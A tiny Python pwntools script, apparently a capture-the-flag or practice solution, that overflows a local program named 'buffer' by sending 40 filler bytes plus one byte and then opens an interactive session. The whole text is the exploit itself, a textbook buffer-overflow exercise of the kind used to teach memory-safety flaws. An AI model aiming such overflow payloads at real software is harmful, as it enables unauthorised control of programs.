from pwn import *

p = process('./buffer')

payload = b'A' * 40
payload += b'1'

p.sendline(payload)

p.interactive()
p.close()
